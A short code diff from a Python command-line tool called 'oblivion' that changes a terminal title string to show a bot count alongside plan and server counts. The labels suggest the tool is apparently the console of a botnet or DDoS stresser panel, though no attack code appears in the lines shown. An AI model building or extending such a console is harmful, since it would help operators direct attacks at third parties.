@@ -178,7 +178,7 @@ def main():
 	global http
 
 	while True:
-		sys.stdout.write("\x1b]2;oblivion user|owner| plan |9999| servers |32|\x07")
+		sys.stdout.write("\x1b]2;oblivion user|owner| plan |9999| servers |32| bots |441||\x07")
 		sin = input("\033[1;35m[\033[34moblivion\033[1;00m]-\033[34m\033[00m ").lower()
 		sinput = sin.split(" ")[0]
 		if sinput == "clear":
